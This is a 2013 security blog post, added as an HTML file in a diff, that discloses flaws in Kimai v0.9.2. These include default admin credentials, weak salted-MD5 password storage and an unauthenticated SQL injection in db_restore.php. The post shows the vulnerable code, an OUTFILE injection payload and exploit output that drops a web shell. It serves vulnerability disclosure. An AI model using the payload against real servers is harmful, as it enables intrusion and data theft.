@@ -1,0 +1,343 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Kimai v0.9.2 - SQLi - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Kimai is a time tracking solution built on the typical LAMP stack. Multiple vulnerabilities were discovered that could allow remote code execution on &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/05/20/kimai-v0.9.2-sqli">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Kimai v0.9.2 - SQLi</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-20T23:01:44-07:00" pubdate data-updated="true">May 20<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Kimai is a time tracking solution built on the typical LAMP stack.  Multiple vulnerabilities were discovered that could allow remote code execution on the remote server.  These appear to be fixed in their source repository (<a href="https://github.com/kimai/kimai">here</a>), but none of the distribution packages (<a href="https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip">v0.9.2.1306-3</a>) have the patched version.</p>
+
+<p>On installation, a default administrative account is generated with the following credentials: admin:changeme.  The /install/ folder is not automatically deleted, but instead a pop-up is shown each time the administrator logs in, alerting them that they should delete this folder in order to protect their system from malicious modifications.  If this folder is not deleted, it could allow unauthenticated users the ability to wipe the remote system&rsquo;s install of Kimai.</p>
+
+<p>There are multiple directory indexes (<code>/kimai/libraries/</code>) that disclose paths, version information, and files, as well as path disclosure (<code>/kimai/error.php?err=db</code>):</p>
+
+<p><img class="center" src="http://1.bp.blogspot.com/-FQ9oSQqSVEs/UZp1oyYlMkI/AAAAAAAAAeY/c8JuSaxjRW0/s640/kimai_path.jpg"></p>
+
+<p>The file <code>/kimai/db_restore.php</code> is an experimental page that can be used to restore, delete, and create backups of the Kimai system.  This page can be accessed without authentication or authorization, and no audit log is generated.  This page is vulnerable to SQLi when restoring a generated backup.</p>
+
+<p>Once a backup is created, the recovery POST appears as such:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /kimai/db_restore.php HTTP/1.1
+</span><span class='line'>Host: 192.168.1.219
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.1.219/kimai/db_restore.php
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 37
+</span><span class='line'>
+</span><span class='line'>dates%5B%5D=1369028276&submit=recover</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The initial request is pulled in from the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (isset($_REQUEST['submit'])) 
+</span><span class='line'>{
+</span><span class='line'>    if (($_REQUEST['submit'] == $kga['lang']['backup'][2]) && (isset($_REQUEST['dates']))) 
+</span><span class='line'>    {
+</span><span class='line'>        $dates = $_REQUEST['dates'];</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The tables are then queried, and the following code is executed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  // Bis rev 733 gab es in tabelle ldr keinen Primary Key ...
+</span><span class='line'>        $query = "SELECT value FROM kimai_bak_" . $dates[0] . "_kimai_var WHERE var = 'revision' LIMIT 0,1;";
+</span><span class='line'>   
+</span><span class='line'>        if ($kga['server_conn'] == "pdo") {
+</span><span class='line'>                if (is_object($pdo_conn)) {
+</span><span class='line'>                    $pdo_query = $pdo_conn-&gt;prepare($query);
+</span><span class='line'>                    $success = $pdo_query-&gt;execute(array());
+</span><span class='line'>                $revision = $pdo_query-&gt;fetch(PDO::FETCH_ASSOC);
+</span><span class='line'>                }
+</span><span class='line'>        } else {
+</span><span class='line'>            if (is_object($conn)) {
+</span><span class='line'>                $success = $conn-&gt;Query($query);
+</span><span class='line'>            $revision = $conn-&gt;RowArray(0,MYSQL_ASSOC);
+</span><span class='line'>            }
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>dates</code> parameter is used within the query without sanitization, leading to a classic SQL injection vulnerability.  This is quite serious as the page is accessible without needing to be authenticated or authorized to the Kimai system.</p>
+
+<p>We can exploit this by generating a new backup, and running a typical SQLi, where the POST data appears as such:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dates%5B%5D=1369028276_kimai_var%20UNION%20SELECT%20INTO%20OUTFILE%20'hacked';--%20&submit=recover</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This will dump all output from the query into the file &lsquo;hacked&rsquo; on the remote server.  Using this, we can dump one column from any table in the database.</p>
+
+<p>Passwords are stored using the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$passCrypt = md5($kga['password_salt'].$password.$kga['password_salt']);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is quite weak, as the salt is static for each user and can be pulled from the include/autoconf.php file.</p>
+
+<p>Session&rsquo;s do not enforce any form of source verification, and thusly can be hijacked.</p>
+
+<p>Here&rsquo;s a run from the script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python kimai_sqli.py -i 192.168.1.83 -w
+</span><span class='line'>[!] Using backup id 1369074792
+</span><span class='line'>[!] Shell dropped.  Go hit http://192.168.1.83/kimai/41e93.php?rr=ls
+</span><span class='line'>root@kali:~# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="src" src="http://3.bp.blogspot.com/-N4SxE1sJCMI/UZpyu-ABNWI/AAAAAAAAAeM/mJREYhveVCs/s640/kimai_run.jpg"></p>
+
+<p><a href="http://www.exploit-db.com/exploits/25606/">Exploit</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-20T23:01:44-07:00" pubdate data-updated="true">May 20<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/kimai/'>kimai</a>, <a class='category' href='/blog/categories/sqli/'>sqli</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/05/20/kimai-v0.9.2-sqli/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/05/20/kimai-v0.9.2-sqli/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/04/20/motorola-surfboard-multiple-vulnerabilities/" title="Previous Post: Motorola Surfboard - Multiple Vulnerabilities">&laquo; Motorola Surfboard - Multiple Vulnerabilities</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/" title="Next Post: PHD Help Desk 2.12 - SQLi/XSS">PHD Help Desk 2.12 - SQLi/XSS &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
